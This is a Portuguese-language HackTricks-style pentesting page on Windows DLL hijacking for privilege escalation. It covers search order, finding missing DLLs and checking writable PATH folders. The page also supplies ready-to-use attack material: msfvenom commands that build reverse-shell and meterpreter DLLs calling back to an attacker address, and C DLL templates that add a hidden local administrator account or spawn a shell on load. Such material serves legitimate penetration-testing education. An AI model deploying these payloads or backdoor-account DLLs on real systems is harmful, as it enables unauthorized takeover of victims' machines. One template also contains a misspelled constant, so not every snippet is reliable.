# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

DLL Hijacking envolve manipular um aplicativo confiável para carregar um DLL malicioso. Este termo abrange várias táticas como **DLL Spoofing, Injection, e Side-Loading**. É utilizado principalmente para execução de código, alcançando persistência e, menos comumente, escalonamento de privilégios. Apesar do foco em escalonamento aqui, o método de hijacking permanece consistente entre os objetivos.

### Common Techniques

Vários métodos são empregados para DLL hijacking, cada um com sua eficácia dependendo da estratégia de carregamento de DLL do aplicativo:

1. **DLL Replacement**: Trocar um DLL genuíno por um malicioso, opcionalmente usando DLL Proxying para preservar a funcionalidade do DLL original.
2. **DLL Search Order Hijacking**: Colocar o DLL malicioso em um caminho de busca à frente do legítimo, explorando o padrão de busca do aplicativo.
3. **Phantom DLL Hijacking**: Criar um DLL malicioso para um aplicativo carregar, pensando que é um DLL necessário que não existe.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo ao DLL malicioso.
5. **WinSxS DLL Replacement**: Substituir o DLL legítimo por um malicioso no diretório WinSxS, um método frequentemente associado ao side-loading de DLL.
6. **Relative Path DLL Hijacking**: Colocar o DLL malicioso em um diretório controlado pelo usuário com o aplicativo copiado, semelhante às técnicas de Binary Proxy Execution.

## Finding missing Dlls

A maneira mais comum de encontrar DLLs ausentes em um sistema é executando [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **seguinte 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e apenas mostrar a **Atividade do Sistema de Arquivos**:

![](<../../../images/image (153).png>)

Se você está procurando por **dlls ausentes em geral**, você **deixa** isso rodando por alguns **segundos**.\
Se você está procurando por um **dll ausente dentro de um executável específico**, você deve configurar **outro filtro como "Process Name" "contains" "\<exec name>", executá-lo e parar de capturar eventos**.

## Exploiting Missing Dlls

Para escalar privilégios, a melhor chance que temos é ser capaz de **escrever um dll que um processo privilegiado tentará carregar** em algum **lugar onde será pesquisado**. Portanto, seremos capazes de **escrever** um dll em uma **pasta** onde o **dll é pesquisado antes** da pasta onde o **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde o dll será pesquisado** e o **dll original não existe** em nenhuma pasta.

### Dll Search Order

**Dentro da** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como os DLLs são carregados especificamente.**

**Aplicativos do Windows** procuram por DLLs seguindo um conjunto de **caminhos de busca pré-definidos**, aderindo a uma sequência particular. O problema do DLL hijacking surge quando um DLL prejudicial é estrategicamente colocado em um desses diretórios, garantindo que ele seja carregado antes do DLL autêntico. Uma solução para prevenir isso é garantir que o aplicativo use caminhos absolutos ao se referir aos DLLs que requer.

Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:

1. O diretório de onde o aplicativo foi carregado.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho deste diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não há função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca de DLL.

Essa é a **ordem de busca padrão** com **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual sobe para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Finalmente, note que **um dll pode ser carregado indicando o caminho absoluto em vez apenas o nome**. Nesse caso, esse dll **será pesquisado apenas nesse caminho** (se o dll tiver dependências, elas serão pesquisadas como se fossem carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

#### Exceptions on dll search order from Windows docs

Certas exceções à ordem padrão de busca de DLL são notadas na documentação do Windows:

- Quando um **DLL que compartilha seu nome com um já carregado na memória** é encontrado, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação de redirecionamento e um manifesto antes de recorrer ao DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pelo DLL**.
- Em casos onde o DLL é reconhecido como um **DLL conhecido** para a versão atual do Windows, o sistema utilizará sua versão do DLL conhecido, juntamente com quaisquer de seus DLLs dependentes, **abrindo mão do processo de busca**. A chave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista desses DLLs conhecidos.
- Se um **DLL tiver dependências**, a busca por esses DLLs dependentes é realizada como se fossem indicados apenas por seus **nomes de módulo**, independentemente de o DLL inicial ter sido identificado através de um caminho completo.

### Escalating Privileges

**Requirements**:

- Identificar um processo que opera ou operará sob **diferentes privilégios** (movimento horizontal ou lateral), que está **faltando um DLL**.
- Garantir que o **acesso de escrita** esteja disponível para qualquer **diretório** no qual o **DLL** será **pesquisado**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando um dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
No caso de você ter sorte e se encontrar atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá um **PoC** de um Dll hijacking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de escrita).

Note que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de um dll com:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar do Dll Hijacking para escalar privilégios** com permissões para escrever em uma **pasta do System Path**, verifique:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em qualquer pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **funções do PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar um dll que exporte pelo menos todas as funções que o executável importará dele**. De qualquer forma, note que o Dll Hijacking é útil para [escalar do nível de integridade Médio para Alto **(bypass UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**Alto para SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar um dll válido** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **modelos** ou para criar um **dll com funções não requeridas exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente, um **Dll proxy** é um Dll capaz de **executar seu código malicioso quando carregado**, mas também de **expor** e **funcionar** como **esperado** ao **revezar todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar um dll proxificado** ou **indicar o Dll** e **gerar um dll proxificado**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Note que em vários casos o Dll que você compila deve **exportar várias funções** que serão carregadas pelo processo da vítima; se essas funções não existirem, o **binário não conseguirá carregá-las** e o **exploit falhará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referências

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


{{#include ../../../banners/hacktricks-training.md}}
